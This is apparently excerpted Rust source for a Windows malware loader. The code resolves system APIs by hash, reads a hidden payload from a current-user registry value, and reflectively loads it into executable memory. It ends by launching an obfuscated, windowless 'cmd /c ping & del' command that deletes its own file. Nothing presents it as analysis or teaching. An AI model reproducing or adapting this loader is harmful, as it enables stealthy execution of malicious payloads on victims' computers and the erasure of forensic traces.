...
type VirtualAlloc = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type LoadLibraryA = unsafe extern "system" fn(*const u8) -> isize;
type GetProcAddress = unsafe extern "system" fn(isize, *const u8) -> Option<unsafe extern "system" fn()>;
type GetModuleFileNameA = unsafe extern "system" fn(isize, *mut u8, u32) -> u32;
type CreateProcessA = unsafe extern "system" fn(*const u8, *mut u8, *const c_void, *const c_void, i32, u32, *const c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
...
type RegQueryValueExW = unsafe extern "system" fn(isize, *const u16, *const u32, *mut u32, *mut u8, *mut u32) -> i32;
...
unsafe fn read_registry_payload() -> Result<Vec<u8>, ()> {
    // Load advapi32
    let load_lib: LoadLibraryA = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    load_lib(b"advapi32.dll\0".as_ptr());
    
    let advapi32 = get_module_by_hash(HASH_ADVAPI32).ok_or(())?;
    let reg_open: RegOpenKeyExW = mem::transmute(get_export_by_hash(advapi32, HASH_REG_OPEN_KEY_EX_W).ok_or(())?);
    let reg_query: RegQueryValueExW = mem::transmute(get_export_by_hash(advapi32, HASH_REG_QUERY_VALUE_EX_W).ok_or(())?);
    let reg_close: RegCloseKey = mem::transmute(get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY).ok_or(())?);
    ...
    if reg_open(HKEY_CURRENT_USER, path_wide.as_ptr(), 0, KEY_READ, &mut hkey) != 0 { return Err(()); }
    ...
    let mut size: u32 = 0;
    let mut dtype: u32 = 0;
    reg_query(hkey, val_wide.as_ptr(), ptr::null(), &mut dtype, ptr::null_mut(), &mut size);
    
    // Read value
    let mut buffer: Vec<u8> = vec![0; size as usize];
    if reg_query(hkey, val_wide.as_ptr(), ptr::null(), &mut dtype, buffer.as_mut_ptr(), &mut size) != 0 {
        reg_close(hkey);
        return Err(());
    }
    reg_close(hkey);
...
unsafe fn reflective_load(pe_data: &[u8]) -> Result<*const c_void, ()> {
    let virtual_alloc: VirtualAlloc = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC).ok_or(())?;
    let virtual_protect: VirtualProtect = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_PROTECT).ok_or(())?;
    let load_lib: LoadLibraryA = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    let get_proc: GetProcAddress = resolve_api(HASH_KERNEL32, HASH_GET_PROC_ADDRESS).ok_or(())?;
    ...
    let image_base = virtual_alloc(ptr::null(), opt.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ...
    resolve_imports(image_base, opt, load_lib, get_proc)?;
    
    let mut old_prot: u32 = 0;
    virtual_protect(image_base, opt.SizeOfImage as usize, PAGE_EXECUTE_READWRITE, &mut old_prot);
...
unsafe fn resolve_imports(base: *mut c_void, opt: &IMAGE_OPTIONAL_HEADER64, load_lib: LoadLibraryA, get_proc: GetProcAddress) -> Result<(), ()> {
    ...
    while (*import).Name != 0 {
        ...
        while *orig_thunk != 0 {
            let addr = if (*orig_thunk & (1usize << 63)) != 0 {
                get_proc(dll, (*orig_thunk & 0xFFFF) as *const u8)
            } else {
                get_proc(dll, (base as usize + *orig_thunk as usize + 2) as *const u8)
            };
...
unsafe fn schedule_self_delete() {
    let get_mod_fname: GetModuleFileNameA = match resolve_api(HASH_KERNEL32, HASH_GET_MODULE_FILE_NAME_A) {
        Some(f) => f,
        None => return,
    };
    ...
    get_mod_fname(0, path.as_mut_ptr(), 260);
    
    let path_str = std::ffi::CStr::from_ptr(path.as_ptr() as *const i8).to_string_lossy();
    let cmd = x(&[0x36, 0x38, 0x31]);
    let full_cmd = format!("{} /c ping 127.0.0.1 -n 2 > nul & del \"{}\"", cmd, path_str);
    
    let mut cmd_bytes: Vec<u8> = full_cmd.into_bytes();
    cmd_bytes.push(0);
    ...
    create_proc(ptr::null(), cmd_bytes.as_mut_ptr(), ptr::null(), ptr::null(), 0, CREATE_NO_WINDOW, ptr::null(), ptr::null(), &si, &mut pi);
}
